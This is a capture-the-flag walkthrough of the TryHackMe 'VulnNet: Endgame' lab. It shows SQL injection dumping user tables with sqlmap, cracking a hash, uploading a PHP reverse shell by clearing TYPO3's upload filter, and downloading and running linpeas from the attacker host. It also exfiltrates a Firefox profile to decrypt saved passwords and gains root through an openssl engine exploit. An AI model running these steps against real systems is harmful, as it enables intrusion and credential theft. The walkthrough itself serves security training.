# Setting up hosts
```sh
⚡ cat /etc/hosts
127.0.0.1       localhost
10.10.47.8	vulnnet.thm
⚡ ping vulnnet.thm
PING vulnnet.thm (10.10.47.8) 56(84) bytes of data.
64 bytes from vulnnet.thm (10.10.47.8): icmp_seq=1 ttl=63 time=58.2 ms
64 bytes from vulnnet.thm (10.10.47.8): icmp_seq=2 ttl=63 time=57.0 ms
64 bytes from vulnnet.thm (10.10.47.8): icmp_seq=3 ttl=63 time=57.8 ms
^C
--- vulnnet.thm ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 57.016/57.676/58.244/0.505 ms
```
# Enumeration
## Port and service scanning with [[Nmap]]
```sh
⚡ sudo nmap -A -p- -oN nmap_results.txt vulnnet.thm
[sudo] password for sami: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-31 15:33 EET
Nmap scan report for vulnnet.thm (10.10.47.8)
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb2ee6cc79f47d682c11bc4b631908af (RSA)
|   256 8061bf8caad14d4468154533edeb82a7 (ECDSA)
|_  256 878604e9e0c0602aab878e9bc705351c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Soon &mdash; Fully Responsive Software Design by VulnNet
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/31%OT=22%CT=1%CU=39539%PV=Y%DS=2%DC=T%G=Y%TM=63B03A
OS:51%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST
OS:11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   57.20 ms 10.11.0.1
2   57.38 ms vulnnet.thm (10.10.47.8)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.98 seconds
```
**Notes:**
- Open ports:
	- 22 for `ssh`
	- 80 for `http`
- Services:
	- `Apache httpd 2.4.29` `Apache/2.4.29` 
- OS:
	- `Linux`
## Domain directory scanning with [[Gobuster]]
```sh
⚡ gobuster dir -u http://vulnnet.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,js,html,txt -t 20 -q
/.php                 (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://vulnnet.thm/images/]
/.html                (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 4346]
/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]
/README.txt           (Status: 200) [Size: 743]
/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/]
/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/sass                 (Status: 301) [Size: 309] [--> http://vulnnet.thm/sass/]
/server-status        (Status: 403) [Size: 276]
```
**Notes:**
- Nothing interesting
## Subdomain scanning with [[Ffuf]]
```sh
⚡ffuf -u http://vulnnet.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.vulnnet.thm' -fs 0 -fs 65 -of md ffuf_results.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.vulnnet.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 65
________________________________________________
api                     [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 57ms]
shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 1843ms]
blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 3462ms]
admin1                  [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
```
**Notes:**
- api.vulnnet.thm
- shop.vulnnet.thm
- blog.vulnnet.thm
- admin1.vulnnet.thm
## admin1 Directory scanning with [[Gobuster]]
```sh
⚡ gobuster dir -u http://admin1.vulnnet.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,js,html,txt -t 20 -q -o gobuster_admin1_results.txt
/.php                 (Status: 403) [Size: 283]
/en                   (Status: 301) [Size: 321] [--> http://admin1.vulnnet.thm/en/]
/.html                (Status: 403) [Size: 283]
/vendor               (Status: 301) [Size: 325] [--> http://admin1.vulnnet.thm/vendor/]
/fileadmin            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/fileadmin/]
/typo3temp            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3temp/]
/LICENSE.txt          (Status: 200) [Size: 18425]
/typo3                (Status: 301) [Size: 324] [--> http://admin1.vulnnet.thm/typo3/]
```
**Notes:**
- checking `vendor` we can see the the CMS system is `typo3` 
![[Pasted image 20221231164501.png]]
- Visiting `http://admin1.vulnnet.thm/typo3/` we see
![[Pasted image 20221231164631.png]]
- Visiting the `http://admin1.vulnnet.thm/LICENSE.txt` we see as well
![[Pasted image 20221231164759.png]]
## Low-hanging fruit: typo3 default credentials
![[Pasted image 20221231165726.png]]
- failed to login with the default creds
## blog.vulnnet.thm source code analysis
- Reading the source-code of the webpage starting from line 284 to 315 we see:
```html
<script>
var getJSON = function(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.responseType = 'json';
    xhr.onload = function() {
        var status = xhr.status;
        if (status == 200) {
            callback(null, xhr.response);
        } else {
            callback(status);
        }
    };
    xhr.send();
};
getJSON('http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1',  function(err, data) {
    if (err != null) {
        console.error(err);
    } else {
    	//unfinished
    	//move to js assets
        console.log(text);
    }
});
</script>
```
- link: `http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1` gets pulled to show us the first post.
- To verify, I went to the second post and scrolled down all the way to the end of the source code to see `http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=2`
## Checking the previous links 
- Checking: `http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1`
![[Pasted image 20221231171817.png]]
- Checking `http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=2`
![[Pasted image 20221231171930.png]]
- Looks like a query to a database system
- Testing SQL injection with `0 OR 1=1` keep in mind `0` shows nothing
![[Pasted image 20221231172211.png]]
- As we see the SQL injection worked and the query returned the first page
## [[Sqlmap]] 
- Obtaining the database type and getting the banner
```sh
⚡ sqlmap -v --batch -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -b
[17:29:50] [INFO] the back-end DBMS is MySQL
[17:29:50] [INFO] fetching banner
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12
banner: '5.7.38-0ubuntu0.18.04.1'
```
- Now that we know that we're dealing with MySQL let's try to get some information
```sh
⚡ sqlmap -v --batch -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -dbs
[17:37:14] [INFO] fetching database names
[17:37:14] [WARNING] reflective value(s) found and filtering out
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin
```
- So we have three databases:
	- `blog`
	- `information_schema`
	- `vn_admin`
- Let's enumerate `vn_admin` first
```sh
⚡ sqlmap -v --batch -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D vn_admin --tables
[17:41:12] [INFO] fetching tables for database: 'vn_admin'
[17:41:12] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
[48 tables]
+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| cache_adminpanel_requestcache               |
| cache_adminpanel_requestcache_tags          |
| cache_hash                                  |
| cache_hash_tags                             |
| cache_imagesizes                            |
| cache_imagesizes_tags                       |
| cache_pages                                 |
| cache_pages_tags                            |
| cache_pagesection                           |
| cache_pagesection_tags                      |
| cache_rootline                              |
| cache_rootline_tags                         |
| cache_treelist                              |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
| pages                                       |
| sys_be_shortcuts                            |
| sys_category                                |
| sys_category_record_mm                      |
| sys_collection                              |
| sys_collection_entries                      |
| sys_file                                    |
| sys_file_collection                         |
| sys_file_metadata                           |
| sys_file_processedfile                      |
| sys_file_reference                          |
| sys_file_storage                            |
| sys_filemounts                              |
| sys_history                                 |
| sys_language                                |
| sys_lockedrecords                           |
| sys_log                                     |
| sys_news                                    |
| sys_note                                    |
| sys_redirect                                |
| sys_refindex                                |
| sys_registry                                |
| sys_template                                |
| tt_content                                  |
| tx_extensionmanager_domain_model_extension  |
| tx_extensionmanager_domain_model_repository |
| tx_impexp_presets                           |
+---------------------------------------------+
```
- Looking at the tables we see `backend_layout`, `be_users` and `fe_users` I guess that `be` means back-end and `fe` means front-end. So let's get the back-end users columns now
```sh
[17:47:35] [INFO] fetching columns for table 'be_users' in database 'vn_admin'
[17:47:35] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
Table: be_users
[34 columns]
+-----------------------+----------------------+
| Column                | Type                 |
+-----------------------+----------------------+
| admin                 | smallint(5) unsigned |
| allowed_languages     | varchar(255)         |
| avatar                | int(10) unsigned     |
| category_perms        | text                 |
| crdate                | int(10) unsigned     |
| createdByAction       | int(11)              |
| cruser_id             | int(10) unsigned     |
| db_mountpoints        | text                 |
| deleted               | smallint(5) unsigned |
| description           | text                 |
| disable               | smallint(5) unsigned |
| disableIPlock         | smallint(5) unsigned |
| email                 | varchar(255)         |
| endtime               | int(10) unsigned     |
| file_mountpoints      | text                 |
| file_permissions      | text                 |
| lang                  | varchar(6)           |
| lastlogin             | int(10) unsigned     |
| lockToDomain          | varchar(50)          |
| options               | smallint(5) unsigned |
| password              | varchar(100)         |
| pid                   | int(10) unsigned     |
| realName              | varchar(80)          |
| starttime             | int(10) unsigned     |
| TSconfig              | text                 |
| tstamp                | int(10) unsigned     |
| uc                    | mediumblob           |
| uid                   | int(10) unsigned     |
| usergroup             | varchar(255)         |
| usergroup_cached_list | text                 |
| userMods              | text                 |
| username              | varchar(50)          |
| workspace_id          | int(11)              |
| workspace_perms       | smallint(6)          |
+-----------------------+----------------------+
```
- Notice that we have `password` and `username`, let these be our next enumeration target
```sh
⚡ sqlmap -v --batch -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D vn_admin -T be_users -C username,password --dump
[17:59:09] [INFO] fetching entries of column(s) 'password,username' for table 'be_users' in database 'vn_admin'
Database: vn_admin
Table: be_users
[1 entry]
+----------+---------------------------------------------------------------------------------------------------+
| username | password                                                                                          |
+----------+---------------------------------------------------------------------------------------------------+
| chris_w  | $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg |
+----------+---------------------------------------------------------------------------------------------------+
```
- Now we have username: `chris_w` and hash: `$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg` . With that obtained, let's enumerate the other database `blog`
```sh
⚡ sqlmap -v --batch -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D blog --tables
[18:02:43] [INFO] fetching tables for database: 'blog'
[18:02:43] [WARNING] reflective value(s) found and filtering out
Database: blog
[4 tables]
+------------+
| blog_posts |
| details    |
| metadata   |
| users      |
+------------+
```
- Found `users` table
```sh
⚡ sqlmap -v --batch -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D blog -T users --columns
[18:03:46] [INFO] fetching columns for table 'users' in database 'blog'
[18:03:46] [WARNING] reflective value(s) found and filtering out
Database: blog
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+
```
- Good, let's dump the `username` and `password` columns
```sh
⚡ sqlmap -v --batch -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D blog -T users -C username,password --dump
[18:08:13] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'blog'
[18:08:13] [WARNING] reflective value(s) found and filtering out
Database: blog
Table: users
[651 entries]
+--------------------+---------------------+
| username           | password            |
+--------------------+---------------------+
[18:08:14] [WARNING] console output will be trimmed to last 256 rows due to large table size
| lspikinsaz         | D8Gbl8mnxg          |
| profeb0            | kLLxorKfd           |
...
| oboatmani1         | kSKBUj8             |
| rtamblingi2        | BIkqvmX             |
+--------------------+---------------------+
```
- That's a long list of users and plaintext passwords, I guess these passwords can be used to crack the previous hash of the user `chris_w`.
## Building the password list with [[awk]]
```sh
awk -F, '{ print $2 }' /home/sami/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv > password.txt
cat password.txt
D8Gbl8mnxg
kLLxorKfd
cdXAJAR
0hdeFiZBRJ
6rl6qXSJDrr
DuYMuI
fwbk0Vgo
92Fb3vBF5k75
...
kSKBUj8
BIkqvmX⏎
```
## [[John The Ripper]] to crack the hash
```sh
⚡john hash.txt --wordlist=password.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (argon2 [Blake2 AVX])
Cost 1 (t) is 16 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 2 for all loaded hashes
Cost 4 (type [0:Argon2d 1:Argon2i]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
vAxWtmNzeTz      (?)
1g 0:00:00:24 DONE (2022-12-31 19:33) 0.04083g/s 5.226p/s 5.226c/s 5.226C/s KmYlhMmg..Z2WgzYZCK
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
- The creds are `chris_w:<REDACTED>
# Foothold
![[Pasted image 20221231200215.png]]
- The settings panel
![[Pasted image 20221231200254.png]]
- The easiest way I think is through file upload, where we basically upload a PHP reverse shell
![[Pasted image 20221231200428.png]]
- As we can notice, we can upload a shell to the system. Let's get our PHP rev. shell ready
```sh
-rw-r--r-- 1 sami sami 5.4K Dec 31 20:06 prs.php
```
- The PHP rev. shell is ready let's upload it
![[Pasted image 20221231200807.png]]
- We see that it's not allowing the upload, I guess it's due to the extension so let's change it
![[Pasted image 20221231200944.png]]
- Again denied, let's find out if we can modify upload filters in the settings somehow
![[Pasted image 20221231201556.png]]
- Going to 'Configure Installation-Wide Options' > Backend [BE] > [BE][fileDenyPattern] is set to empty space > Write Configuration > close 
![[Pasted image 20221231201730.png]]
- Attempting to upload the rev. shell
![[Pasted image 20221231201852.png]]
- Good, let's set up a listener on the attacking machine
```sh
⚡ ncat -nvlp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```
# Reverse shell
```sh
⚡ ncat -nvlp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.47.8.
Ncat: Connection from 10.10.47.8:50562.
Linux vulnnet-endgame 5.4.0-120-generic #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 13:25:05 up  5:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- Now that we have access to the server, let's enumerate what we can do to escalate out privileges
```sh
$ wget http://10.11.4.14:8001/linpeas.sh
--2022-12-31 13:36:15--  http://10.11.4.14:8001/linpeas.sh
Connecting to 10.11.4.14:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827827 (808K) [application/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  431K 2s
    50K .......... .......... .......... .......... .......... 12%  887K 1s
   100K .......... .......... .......... .......... .......... 18%  893K 1s
   150K .......... .......... .......... .......... .......... 24%  885K 1s
   200K .......... .......... .......... .......... .......... 30% 7.59M 1s
   250K .......... .......... .......... .......... .......... 37%  907K 1s
   300K .......... .......... .......... .......... .......... 43%  743K 1s
   350K .......... .......... .......... .......... .......... 49% 26.4M 0s
   400K .......... .......... .......... .......... .......... 55% 65.7M 0s
   450K .......... .......... .......... .......... .......... 61% 74.7M 0s
   500K .......... .......... .......... .......... .......... 68%  974K 0s
   550K .......... .......... .......... .......... .......... 74% 15.1M 0s
   600K .......... .......... .......... .......... .......... 80% 10.0M 0s
   650K .......... .......... .......... .......... .......... 86%  815K 0s
   700K .......... .......... .......... .......... .......... 92% 30.4M 0s
   750K .......... .......... .......... .......... .......... 98% 77.8M 0s
   800K ........                                              100% 60.1M=0.5s

2022-12-31 13:36:16 (1.46 MB/s) - 'linpeas.sh' saved [827827/827827]

$ ls
linpeas.sh
$ chmod +x linpeas.sh      
$ ./linpeas.sh
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034          # no GCC compiler on hte system
$ ls -hla
total 92K
drwxr-xr-x 18 system system 4.0K Jun 15  2022 .
drwxr-xr-x  3 root   root   4.0K Jun 14  2022 ..
-rw-------  1 system system 2.1K Jun 15  2022 .ICEauthority
lrwxrwxrwx  1 root   root      9 Jun 14  2022 .bash_history -> /dev/null
-rw-r--r--  1 system system  220 Jun 14  2022 .bash_logout
-rw-r--r--  1 system system 3.7K Jun 14  2022 .bashrc
drwx------ 16 system system 4.0K Jun 14  2022 .cache
drwx------ 14 system system 4.0K Jun 14  2022 .config
drwx------  3 root   root   4.0K Jun 14  2022 .dbus
drwx------  3 system system 4.0K Jun 14  2022 .gnupg
drwx------  2 root   root   4.0K Jun 14  2022 .gvfs
drwx------  3 system system 4.0K Jun 14  2022 .local
drwxr-xr-x  4 system system 4.0K Jun 14  2022 .mozilla    # attention here
lrwxrwxrwx  1 root   root      9 Jun 14  2022 .mysql_history -> /dev/null
-rw-r--r--  1 system system  807 Jun 14  2022 .profile
-rw-r--r--  1 system system    0 Jun 14  2022 .sudo_as_admin_successful
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Desktop
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Documents
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Downloads
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Music
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Pictures
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Public
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Templates
dr-xr-x---  2 system system 4.0K Jun 14  2022 Utils
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Videos
-rw-------  1 system system   38 Jun 14  2022 user.txt
```
- Checking the user system home directory, there’s a mozilla folder.
In Linux the main Firefox profile folder that stores personal data is in the hidden `~/.mozilla/firefox/` 
```sh
$ cd .mozilla
$ ls -hla
total 16K
drwxr-xr-x  4 system system 4.0K Jun 14  2022 .
drwxr-xr-x 18 system system 4.0K Jun 15  2022 ..
drwxr-xr-x  2 system system 4.0K Jun 14  2022 extensions
drwxr-xr-x  7 system system 4.0K Jun 14  2022 firefox
$ cd extensions	
$ ls
$ ls -hla
total 8.0K
drwxr-xr-x 2 system system 4.0K Jun 14  2022 .
drwxr-xr-x 4 system system 4.0K Jun 14  2022 ..
$ cd ..
$ cd firefox
```
- We can extract the passwords of the user system’s profile in mozilla.  
To do this, we are going to copy the file to our local machine and use a tool to extract the credentials. In order to do that we need to compress the entire `.mozilla` directory recursively and make a copy in the `tmp` directory.
```sh
$ zip /tmp/sys-moz.zip .mozilla -r
$ ls
linpeas.sh
sys-moz.zip
```
- Transfer the directory back to our machine
```sh
$ python3 -m http.server 8001
```
- Unzip the downloaded directory
```sh
⚡unzip sys-moz.zip 
Archive:  sys-moz.zip
   creating: .mozilla/
   creating: .mozilla/extensions/
   creating: .mozilla/firefox/
   creating: .mozilla/firefox/2o9vd4oi.default/
...
  inflating: .mozilla/firefox/2fjnrwth.default-release/features/{7f91ed06-a1ff-4eba-8bac-603e2d8dcecf}/webcompat@mozilla.org.xpi  
  inflating: .mozilla/firefox/2fjnrwth.default-release/SiteSecurityServiceState.txt  
  inflating: .mozilla/firefox/profiles.ini  
```
- Using `firefox-decrypt` decrypt the unzipped directory
```sh
⚡ firefox-decrypt firefox/
Select the Mozilla profile you wish to decrypt
1 -> 2fjnrwth.default-release
2 -> 8mk7ix79.default-release
1
Website:   https://tryhackme.com
Username: 'chris_w@vulnnet.thm'
Password: '<REDACTED>'
```
- from the obtained password, let's login as system through `ssh` on the target machine
```sh 
⚡ ssh system@vulnnet.thm
system@vulnnet.thm's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.

Your Hardware Enablement Stack (HWE) is supported until April 2023.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

system@vulnnet-endgame:~$ id
uid=1000(system) gid=1000(system) groups=1000(system)
system@vulnnet-endgame:~$ whoami
system
system@vulnnet-endgame:~$ 
```
# Privileges Escalation
```sh
system@vulnnet-endgame:/tmp$ wget http://10.11.4.14:8001/linpeas.sh
system@vulnnet-endgame:/tmp$ chmod +x linpeas.sh 
system@vulnnet-endgame:/tmp$ ./linpeas.sh 
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current env capabilities:
Current: =
Current proc capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/home/system/Utils/openssl =ep                   # targeting this
/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
system@vulnnet-endgame:/tmp$ ls -hla /home/system/Utils/openssl 
-r-xr-x--- 1 system system 707K Jun 14  2022 /home/system/Utils/openssl
```
- Googling openssl capabilities privilege escalation we find this [repo](https://github.com/IAmNewbie99/openssl-privilege-escalation)
- Following the instructions given we get root shell:
```sh
system@vulnnet-endgame:/tmp$ /home/system/Utils/openssl req -engine ./exploit2.so 
root@vulnnet-endgame:/tmp# find / -name root.txt -type f 2>/dev/null
/root/thm-flag/root.txt
^C
root@vulnnet-endgame:/tmp# cat /root/thm-flag/root.txt
THM{REDACTED}
```
# Thanks for reading :)